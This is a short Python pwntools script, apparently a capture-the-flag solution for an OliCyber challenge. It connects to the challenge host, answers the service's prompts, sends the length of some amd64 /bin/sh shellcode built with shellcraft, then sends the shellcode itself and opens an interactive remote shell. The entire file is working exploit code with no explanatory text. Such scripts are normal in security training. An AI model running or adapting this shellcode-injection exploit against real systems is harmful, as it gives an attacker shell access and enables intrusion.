#!/usr/bin/env python3
from pwn import *

asm_code = shellcraft.amd64.linux.sh()
shellcode = asm(asm_code, arch='x86_64')
context.terminal = ('kgx', '-e')

r = remote('software-20.challs.olicyber.it', 13003)
    
r.recvuntil(b'iniziare ...')
r.send(b's')
log.info(f'Char sent')

r.recvuntil(b'(max 4096): ')
r.sendline(str(len(shellcode)).encode())
log.info(f'Length sent')

r.recvuntil(b'bytes: ')
r.sendline(shellcode)
log.info(f'Shellcode sent')

r.interactive()
